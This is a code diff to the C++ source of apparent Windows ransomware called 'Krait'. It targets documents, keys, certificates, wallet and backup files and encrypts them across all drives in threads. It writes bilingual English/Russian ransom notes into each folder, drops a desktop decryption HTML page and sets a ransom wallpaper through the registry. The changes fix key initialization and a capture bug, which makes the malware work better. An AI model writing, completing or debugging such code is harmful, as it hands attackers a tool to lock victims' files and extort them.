@@ -27,7 +27,6 @@ std::vector<std::string> FileScanner::GetExtensions() {
         ".ps1", ".bat", ".cmd", ".py", ".js", ".html", ".css",
         ".cpp", ".c", ".h", ".java", ".cs", ".php",
         ".xml", ".json", ".yml", ".yaml", ".ini", ".cfg",
-        ".exe", ".dll", ".sys", // Skip system but include for scanning logic
         ".key", ".pem", ".crt", ".cer", ".pfx",
         ".wallet", ".dat", ".bak", ".backup"
     };
@@ -82,7 +81,6 @@ void FileScanner::EncryptDirectory(const std::string& dir, int threadIndex) {
             std::string path = entry.path().string();
             if (ShouldSkipPath(path)) continue;
             
-            // Check extension
             std::string ext = fs::path(path).extension().string();
             std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
             
@@ -92,14 +90,15 @@ void FileScanner::EncryptDirectory(const std::string& dir, int threadIndex) {
             }
         }
         
-        // Encrypt each file
-        std::string personalKey = KeyGen::GeneratePersonalKey(KeyGen::GenerateMasterKey());
+        auto masterKey = KeyGen::GenerateMasterKey();
+        std::string personalKey = KeyGen::GeneratePersonalKey(masterKey);
+        Encryption::Initialize(masterKey);
+        
         for (const auto& file : files) {
             if (stopFlag) break;
             Encryption::EncryptFile(file);
         }
         
-        // Create READ_ME.txt in this directory
         if (!files.empty()) {
             CreateReadMe(dir, personalKey);
         }
@@ -128,22 +127,20 @@ void FileScanner::CreateReadMe(const std::string& dir, const std::string& person
     if (!file) return;
     
     file << "ENG:\n";
-    file << "Hello. Your personal files—such as documents, images, archives, and others—have been encrypted by the Krait security system! To decrypt your files, you need to open the KRAIT_DECRYPT.html file located on your desktop. On that page, enter your personal key into the input field; you can find this key in the READ_ME.txt file located in each encrypted folder. After entering your personal key, click the \"decrypt\" button and enter the resulting password into the Krait window (which can be opened from your desktop via KRAIT.exe).\n";
+    file << "Hello. Your personal files have been encrypted by the Krait security system! To decrypt your files, you need to open the KRAIT_DECRYPT.html file located on your desktop. On that page, enter your personal key into the input field; you can find this key in the READ_ME.txt file located in each encrypted folder. After entering your personal key, click the \"decrypt\" button and enter the resulting password into the Krait window.\n";
     file << "You personal key: " << personalKey << "\n\n";
     
     file << "RUS:\n";
-    file << "Здравствуйте. Ваши личные файлы — такие как документы, изображения, архивы и другие — были зашифрованы системой безопасности Krait! Чтобы расшифровать файлы, откройте файл KRAIT_DECRYPT.html, расположенный на рабочем столе. На открывшейся странице введите свой персональный ключ в поле ввода; этот ключ можно найти в файле READ_ME.txt, который находится в каждой папке с зашифрованными файлами. После ввода персонального ключа нажмите кнопку «decrypt» и введите полученный пароль в окне программы Krait (его можно открыть с рабочего стола, запустив KRAIT.exe).\n";
+    file << "Здравствуйте. Ваши личные файлы были зашифрованы системой безопасности Krait! Чтобы расшифровать файлы, откройте файл KRAIT_DECRYPT.html, расположенный на рабочем столе. На открывшейся странице введите свой персональный ключ в поле ввода; этот ключ можно найти в файле READ_ME.txt, который находится в каждой папке с зашифрованными файлами. После ввода персонального ключа нажмите кнопку «decrypt» и введите полученный пароль в окне программы Krait.\n";
     file << "Ваш персональный ключ: " << personalKey << "\n";
     file.close();
 }
 
 void FileScanner::CreateDesktopFiles(const std::string& personalKey) {
-    // Get desktop path
     char desktopPath[MAX_PATH];
     SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
     std::string desktop = std::string(desktopPath);
     
-    // Create KRAIT_DECRYPT.html
     std::string htmlPath = desktop + "\\KRAIT_DECRYPT.html";
     std::ofstream html(htmlPath);
     if (html) {
@@ -175,13 +172,11 @@ button:hover { background: #cc0000; }
 function decrypt() {
     var key = document.getElementById('keyInput').value.trim();
     if (key.length < 16) { alert('Invalid key format'); return; }
-    // Reverse the key derivation
     var clean = key.replace(/-/g, '');
     var bytes = [];
     for (var i = 0; i < clean.length; i += 2) {
         bytes.push(parseInt(clean.substr(i, 2), 16));
     }
-    // Simple transformation - reverse and XOR with 0xAA
     var result = '';
     for (var i = bytes.length - 1; i >= 0; i--) {
         var val = bytes[i] ^ 0xAA;
@@ -196,21 +191,11 @@ function decrypt() {
 )";
         html.close();
     }
-    
-    // Extract decryptor executable from resources
-    // (Will be handled at compile time - resource.rc)
-    std::string exePath = desktop + "\\KRAIT.exe";
-    // Decryptor binary will be embedded as resource and extracted here
-    // Implementation in main.cpp
 }
 
 void FileScanner::SetWallpaper() {
-    // Extract krait.webp from resources and set as wallpaper
-    // Implementation using SystemParametersInfo
     std::string path = "C:\\Windows\\Temp\\krait.webp";
-    // Extract resource to temp, then set
     
-    // HKEY_CURRENT_USER\Control Panel\Desktop
     HKEY hKey;
     RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_SET_VALUE, &hKey);
     RegSetValueExA(hKey, "Wallpaper", 0, REG_SZ, (BYTE*)path.c_str(), path.length() + 1);
@@ -229,7 +214,7 @@ void FileScanner::StartEncryption() {
     
     auto drives = GetDrives();
     for (int i = 0; i < drives.size(); i++) {
-        threads.emplace_back([i, drives, i]() {
+        threads.emplace_back([i, drives]() {
             EncryptDrive(drives[i], i);
         });
     }
